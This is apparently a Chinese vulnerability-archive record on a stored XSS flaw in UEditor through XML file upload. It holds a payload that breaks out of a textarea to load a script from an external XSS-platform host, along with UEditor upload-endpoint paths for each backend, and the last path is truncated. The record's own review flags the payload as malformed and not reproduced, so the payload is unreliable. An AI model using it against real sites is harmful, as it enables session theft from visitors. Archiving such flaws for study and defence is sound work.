---
source: "hatch 补库批 20260928"
product: "UEditor / 附件XML"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ueditor 允许xml上传的xss漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：无版本；需XML上传与同源渲染"
side_effects: "未执行；本文需注意的操作影响：缺上传/访问证据；只有端点清单且uploadimag截断，没有响应或浏览器条件"
source_status: "unknown"
id: "vw-4dfd2cc25cd97c2ff621c02d"
entity_id: "ve-4dfd2cc25cd97c2ff621c02d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：无版本；需XML上传与同源渲染

代码与实验材料：payload混闭合textarea、HTML script和错误xmlns，不是合法等价XML命名空间测试

来源证据范围：无来源，外链XSS平台非可信验证目标

- **代码与转录边界（1）**：XML载荷语法与namespace损坏；依据：xmlns:something填“xss平台地址”而不是XHTML命名空间；src引号被闭合并插HTML，无法按所述XML逻辑工作。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **代码与转录边界（2）**：缺上传/访问证据；依据：只有端点清单且uploadimag截断，没有响应或浏览器条件。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ueditor 允许xml上传的xss漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    <html>
    <head></head>
    <body>
    <something:script src="</tExtArEa>'"><sCRiPt sRC=http://xssye.com/tVbS></sCrIpT>" xmlns:something="xss平台地址">1234</something:script>
    </body>
    </html>

Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀

    /ueditor/asp/config.json
    /ueditor/net/config.json
    /ueditor/php/config.json
    /ueditor/jsp/config.json

上传文件路径

    /ueditor/index.html

    /ueditor/asp/controller.asp?action=uploadimage
    /ueditor/asp/controller.asp?action=uploadfile

    /ueditor/net/controller.ashx?action=uploadimage
    /ueditor/net/controller.ashx?action=uploadfile

    /ueditor/php/controller.php?action=uploadfile
    /ueditor/php/controller.php?action=uploadimage

    /ueditor/jsp/controller.jsp?action=uploadfile
    /ueditor/jsp/controller.jsp?action=uploadimag
